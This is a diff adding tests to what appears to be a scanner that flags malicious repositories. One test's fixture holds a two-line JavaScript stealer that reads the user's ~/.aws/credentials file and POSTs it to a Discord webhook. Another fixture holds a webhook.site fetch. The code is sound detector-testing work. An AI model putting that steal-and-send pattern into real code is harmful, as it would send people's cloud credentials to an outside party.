@@ -96,6 +96,26 @@ def test_secret_file_exfil_confirms_alone(tmp_path):
     assert analyze_repo(tmp_path, "evil/grab").confirmed
 
 
+def test_two_exfil_channels_without_cred_do_not_confirm(tmp_path):
+    # tiledesk-server FP: a chat platform legitimately has a Telegram connector
+    # AND a leftover webhook.site URL -- two exfil channels, no credential theft.
+    (tmp_path / "telegram.js").write_text(
+        "const url = 'https://api.telegram.org/bot123/sendMessage';\n", encoding="utf-8")
+    (tmp_path / "httpUtil.js").write_text(
+        "fetch('https://webhook.site/bd710929-9b43');\n", encoding="utf-8")
+    assert not analyze_repo(tmp_path, "tiledesk/server").confirmed
+
+
+def test_steal_and_send_confirms(tmp_path):
+    # Reading a secret file AND an exfil channel = steal-and-send -> confirmed.
+    (tmp_path / "x.js").write_text(
+        "const k = require('fs').readFileSync(home + '/.aws/credentials');\n"
+        "fetch('https://discord.com/api/webhooks/1/x', {method:'POST', body:k});\n",
+        encoding="utf-8",
+    )
+    assert analyze_repo(tmp_path, "evil/stealer").confirmed
+
+
 def test_ci_writing_deploy_key_does_not_confirm(tmp_path):
     # The opencode FP: CI legitimately WRITES a deploy key from a secret (it does
     # not read+exfil it). ssh-keys is a lone Tier-B -> not enough.
